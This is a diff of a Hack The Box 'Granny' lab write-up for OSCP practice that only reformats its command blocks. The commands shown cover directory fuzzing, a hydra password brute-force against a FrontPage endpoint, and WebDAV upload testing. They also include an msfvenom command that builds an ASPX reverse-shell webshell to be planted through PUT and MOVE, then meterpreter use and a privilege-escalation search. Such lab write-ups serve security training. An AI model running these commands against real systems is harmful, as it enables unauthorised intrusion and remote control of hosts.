@@ -15,7 +15,7 @@ For the my next OSCP-prep box (again curtesy of TJNull's excellent [list of OSCP
 Just like with shocker, I begin by kicking off [AutoRecon][autorecon] on the target.
 
 ```bash
-autorecon -o granny --single-target 10.10.10.15
+$ autorecon -o granny --single-target 10.10.10.15
 ```
 
 While the full `nmap` scan is running, the quick scan has already shown that there is a web-server on port 80. 
@@ -27,8 +27,8 @@ While the full `nmap` scan is running, the quick scan has already shown that the
 
 We can start enumerating that while the full `nmap` scan is still running. As with any webserver, we always begin by doing directory enumeration. We know that this is a windows machine, so we can use ASP.NET file extensions.
 
-```
-ffuf -u http://10.10.10.15/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -e .asp,.aspx,.ashx,.asmx,.html,.exe,.dll -of csv -o ./raft-large-exts.csv -recursion -recursion-strategy greedy
+```bash
+$ ffuf -u http://10.10.10.15/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -e .asp,.aspx,.ashx,.asmx,.html,.exe,.dll -of csv -o ./raft-large-exts.csv -recursion -recursion-strategy greedy
 ```
 
 The `nmap` http enumeration has finished by now, and it looks like it picked up some MS FrontPage endpoints... and a vulnerable FrontPage installation.
@@ -60,8 +60,8 @@ The `nmap` http enumeration has finished by now, and it looks like it picked up 
 
 This serves as a good lesson to always verify automated tool output. If we go diving through the FrontPage directories (directory listing is enabled) we can see that http://10.10.10.15/_vti_bin/_vti_adm/fpadmdll.dll actually requires NTLM authentication. We can use hydra to see if they are using any weak username/password combinations.
 
-```
-hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "/root/HTB/granny/scans/tcp_80_http_auth_hydra.txt" http-get://10.10.10.15/_vti_bin/_vti_adm/fpadmdll.dll
+```bash
+$ hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "/root/HTB/granny/scans/tcp_80_http_auth_hydra.txt" http-get://10.10.10.15/_vti_bin/_vti_adm/fpadmdll.dll
 ```
 
 While that is going we can inspect the rest of the `nmap` HTTP output. This next bit immediately caught my eye.
@@ -83,8 +83,8 @@ This host allows for WebDAV usage, which ideally could be exploited to upload a 
 
 With this proxy set up we can just point `davtest` at localhost 80 and it Burp will forward the traffic to the target server. 
 
-```
-davtest --url http://localhost/
+```bash
+$ davtest --url http://localhost/
 ```
 
 ![](/assets/images/HTB/granny/granny-davtest-burp.png)
@@ -117,8 +117,8 @@ PUT	php	SUCCEED:	http://localhost/DavTestDir_Iqdz9inIgLQYklF/davtest_Iqdz9inIgLQ
 
 It looks like we aren't able to upload `.asp` or `.aspx` files, which would have made our lives a lot easier. However, if we remember the output of the `http-webdav-scan`, we are allowed to use the `MOVE` method. `MOVE` allows us to, well, move files around on the web server (duh), but this also allows us to change the name and extension of the files we move around. Our exploitation plan is now to use WebDAV to upload an `.aspx` webshell as a text file, then use `MOVE` to change it to an ASPX file that the server will execute. First things first, lets generate a webshell using `msfvenom`.
 
-```
-msfvenom -p windows/shell/reverse_tcp -f aspx LHOST=tun0 LPORT=443 -o shell.aspx
+```bash
+$ msfvenom -p windows/shell/reverse_tcp -f aspx LHOST=tun0 LPORT=443 -o shell.aspx
 ```
 
 Next, lets use one of our proxied PUT requests in Burp to upload the contents of `shell.aspx` as a text file.
@@ -177,9 +177,9 @@ meterpreter > download systeminfo.txt
 ```
 
 **Kali**
-```
-wes --update
-wes -e ../loot/systeminfo.txt -o lpe.txt
+```bash
+$ wes --update
+$ wes -e ../loot/systeminfo.txt -o lpe.txt
 ```
 
 Now we can look through some of the results that `wes` returned. Looking through the results that were returned, I see an [exploitdb link][exploit] that talks about token kidnapping (impersonation). Since I know we have the `SeImpersonatePrivilege`, this seems like a good route to check. 
